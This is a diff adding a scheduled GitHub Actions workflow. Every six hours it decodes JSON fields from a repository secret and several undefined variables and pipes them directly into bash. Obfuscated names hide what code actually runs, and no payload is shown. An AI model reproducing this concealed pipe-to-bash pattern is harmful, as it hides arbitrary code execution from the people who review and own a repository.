@@ -1,0 +1,24 @@
+name: huazoujujin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huazoujujin
+        env:
+          vvyf1: ${{ secrets.vvyf1 }}
+        run: |
+          echo $vvyf1 | jq -r .vxfef0442 | /bin/bash
+          echo $d14 | jq -r .qx55 | /bin/bash
+          echo $d1312 | jq -r .xpiqp09 | /bin/bash
+          echo $onmey6 | jq -r .jvsf2703 | /bin/bash
+          echo $xa3279 | jq -r .cvonp1 | /bin/bash
+          echo $f28142 | jq -r .rx12 | /bin/bash
+          echo $urmjg557 | jq -r .xt6 | /bin/bash
+          echo $dhy23 | jq -r .a2 | /bin/bash
+
